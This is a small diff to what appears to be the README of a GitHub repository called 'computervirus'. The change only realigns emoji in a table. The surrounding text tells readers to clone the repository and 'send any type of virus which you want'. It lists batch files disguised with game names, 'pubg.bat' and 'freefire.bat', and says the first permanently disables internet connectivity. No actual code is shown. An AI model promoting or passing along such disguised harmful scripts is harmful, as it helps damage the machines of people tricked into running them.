@@ -9,7 +9,8 @@ git clone https://github.com/official-hack4peace/computervirus
 #### cd computervirus
 #### ls
 #### Now send any type of virus which you want
-### |program  | description  👇       👇                                              |
+### |program  | description                                                     |
+###    👇            👇
 ### |pubg.bat |This program will disable the internet connectivity permanently|
 ### |freefire.bat
 ### |
